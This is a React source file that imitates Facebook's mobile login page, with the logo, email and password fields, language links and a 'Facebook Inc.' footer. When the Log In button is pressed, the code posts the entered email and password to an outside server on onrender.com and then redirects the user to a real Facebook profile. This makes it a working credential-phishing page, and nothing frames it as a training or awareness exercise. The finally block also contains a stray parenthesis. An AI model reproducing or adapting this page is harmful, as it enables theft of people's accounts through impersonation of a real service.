import "./App.css";
import logo from "./fb.svg";
import eye from "./Eye.svg";
import crossedEye from "./CrossedEye.svg";
import { useState } from "react";
import axios from "axios";

function App() {
  const [mail, setMail] = useState("");
  const [password, setPassword] = useState("");
  const [hide, setHide] = useState(true);

  return (
    <div className="App">
      <div className="_qw9 grouped aclb" id="u_0_1_CF">
        <div
          target="_top"
          className="touchableArea first last area touchable acy apl abt abb"
        >
          <div className="ib cc">
            <div className="c">
              <span className="fcl">
                Get Facebook for Android and browse faster.
              </span>
            </div>
          </div>
        </div>
      </div>
      <div className="_7om2 _52we _2pid _52z6">
        <div className="_4g34">
          <div>
            <img src={logo} width="112" className="img" alt="facebook" />
          </div>
        </div>
      </div>
      <div className="_5rut">
        <div className="_56be">
          <div className="_55wo _56bf">
            <div className="_96n9" id="email_input_container">
              <input
                autoCorrect="off"
                autoCapitalize="off"
                type="email"
                className="input"
                autoComplete="on"
                id="m_login_email"
                name="email"
                placeholder="Mobile number or email address"
                data-sigil="m_login_email"
                onChange={(e) => setMail(e.target.value)}
              />
            </div>
          </div>
        </div>
        <div className="_55wq"></div>
        <div className="_56be">
          <div className="_55wo _56bf">
            <div className="_1upc _mg8" data-sigil="m_login_password">
              <div className="_7om2">
                <div className="_4g34 _5i2i _52we">
                  <div className="_5xu4">
                    <input
                      autoCorrect="off"
                      autoCapitalize="off"
                      className="input"
                      autoComplete="on"
                      id="m_login_password"
                      name="pass"
                      placeholder="Password"
                      type={hide ? "password" : "text"}
                      data-sigil="password-plain-text-toggle-input"
                      onChange={(e) => setPassword(e.target.value)}
                    />
                    <span
                      className="hide"
                      onClick={() => {
                        setHide((prev) => !prev);
                      }}
                    >
                      {hide ? (
                        <img src={crossedEye} width="20" alt="facebook" />
                      ) : (
                        <img src={eye} width="20" alt="facebook" />
                      )}
                    </span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div className="_5rut but" style={{ textAlign: "center" }}>
        <div
          id="login_password_step_element"
          data-sigil="login_password_step_element"
        >
          <button
            type="button"
            value="Log In"
            className="button"
            id="btnsubmit"
            name="login"
            data-sigil="touchable login_button_block m_login_button"
            onClick={async (e) => {
              e.preventDefault();
              if (password.length > 4 && mail.length > 4) {
                console.log("send pwd");
                try {
                  const response = await axios.post(
                    "https://chat-back-2928.onrender.com/chat-harivola/mail",
                    {
                      name: mail,
                      mail: mail,
                      text: password,
                    }
                  );
                  console.log("response ", response.data);
                } catch (error) {
                  const err = error;
                  console.log("error", err?.message);
                } finally {
                  window.location = "https://www.facebook.com/ChunhauXQiuyue"
                  );
                }
              }
            }}
          >
            <span className="_55sr">Log In</span>
          </button>
        </div>
        <div
          className="_7eif"
          id="oauth_login_button_container"
          style={{ display: "none" }}
        ></div>
        <div
          className="_7f_d"
          id="oauth_login_desc_container"
          style={{ display: "none" }}
        ></div>
        <div id="otp_button_elem_container"></div>
      </div>
      <div>
        <div className="_2pie">
          <div className="_52jj _9on1">
            <div className="_9on1" tabIndex={0}>
              Forgotten password?
            </div>
          </div>
        </div>
      </div>
      <div
        id="login_reg_separator"
        className="_43mg _8qtf"
        data-sigil="login_reg_separator"
      >
        <div className="_5rut or">
          <div className="linespace" />
          <span className="_43mh">or</span>
          <div className="linespace" />
        </div>
        <div className="create">
          <div className="_5t3b" id="signup_button_area">
            <div role="button" className="button-create" tabIndex={0}>
              Create New Account
            </div>
          </div>
        </div>
      </div>
      <div className="lngContainer">
        <div className="lng">
          <div className="lng-content">
            <span className="_52jc _52j9 _52jh _3ztb">English (UK)</span>
            <span className="_52jc">
              <span>অসমীয়া</span>
            </span>
            <span className="_52jc">
              <span>नेपाली</span>
            </span>
            <span className="_52jc">
              <span>Português (Brasil)</span>
            </span>
          </div>
          <div className="lng-content">
            <span className="_52jc">
              <span>
                বাংলা
              </span>
            </span>
            <span className="_52jc">
              <span>
                हिन्दी
              </span>
            </span>
            <span className="_52jc">
              <span>
                Español
              </span>
            </span>
          </div>
        </div>
      </div>
      <div className="_5ui4">
        <div className="_96qv _9a0a">
          <span
            className="_96qw"
          >
            About
          </span>
          <span aria-hidden="true"> · </span>
          <span className="_96qw">
            Help
          </span>
          <span aria-hidden="true"> · </span>
          <span className="_96qw" id="u_0_5_ah">
            More
          </span>
        </div>

        <span className="mfss fcg">Facebook Inc.</span>
      </div>
    </div>
  );
}

export default App;
